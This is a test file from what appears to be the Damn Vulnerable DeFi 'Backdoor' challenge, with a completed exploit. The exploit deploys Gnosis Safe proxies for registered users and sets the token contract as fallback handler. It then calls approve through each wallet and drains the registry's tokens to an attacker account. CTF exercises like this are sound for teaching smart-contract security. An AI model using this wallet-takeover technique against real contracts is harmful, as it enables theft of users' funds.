const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        console.log("attacker address : " + attacker.address);
        this.fallbackContract = await (await ethers.getContractFactory('FallbackContract', deployer)).deploy(
            this.token.address,
            attacker.address
        );

        //1. singleton : masterCopy.address

        //2. initializer : abi.encodeWithSignature of GnosisSafe::setup(address[], uint256, address, bytes, address, address, uint256, address) from 
        // function setup(
        //     address[] calldata _owners,
        //     uint256 _threshold,
        //     address to,
        //     bytes calldata data,
        //     address fallbackHandler,
        //     address paymentToken,
        //     uint256 payment,
        //     address payable paymentReceiver
        // )

        //3. saltNonce : salt used in create2 to generate a unique address
        //4. callback : this.walletRegistry.address

        //to create a wallet : walletFactory.createProxyWithCallback(masterCopy.address, initializer, saltNonce, callback)
        
        // Solution : Using an attack smart contract, create a wallet, set Alice as owners[0], funds will be transfered to the wallet
        // do it for all users
        owners = [alice.address, bob.address, charlie.address, david.address];
        threshold = 1;
        to = ethers.constants.AddressZero//address(0) or a contract that can execute a delegatecall, can be useful?"
        data = '0x00'//bytes(0) or a data that will be executed by the delegatecall
        // let fallbackHandler = this.fallbackContract.address //address(0)
        let fallbackHandler = this.token.address //address(0)
        let paymentToken =  ethers.constants.AddressZero //address(0) (ETH) or DVT ?
        let payment = 0;//the value of DVT ?
        let paymentReceiver = attacker.address;
        let ABI = ["function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)"];
        let iface = new ethers.utils.Interface(ABI);

        for (let i = 0; i < owners.length; i++) {
            initializers = iface.encodeFunctionData("setup", [[owners[i]], threshold, to, data, fallbackHandler, paymentToken, payment, paymentReceiver]);
            await this.walletFactory.connect(attacker).createProxyWithCallback(this.masterCopy.address, initializers, 0, this.walletRegistry.address);

            this.userWallet = await this.walletRegistry.wallets(users[i]);
            //make an empty call with 0 ether to the wallet with data
            let approveTokenABI = ["function approve(address spender, uint256 amount)"];
            let tokenIface = new ethers.utils.Interface(approveTokenABI);
            console.log("user wallet address : " + this.userWallet);
            console.log("user wallet token balance : " + await this.token.balanceOf(this.userWallet));
            await attacker.sendTransaction({to: this.userWallet, value: 0, data: tokenIface.encodeFunctionData("approve", [attacker.address, ethers.utils.parseEther('10')])});
            console.log("attacker allowance : " + await this.token.allowance(this.userWallet, attacker.address));
            await this.token.connect(attacker).transferFrom(this.userWallet, attacker.address, ethers.utils.parseEther('10'));
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
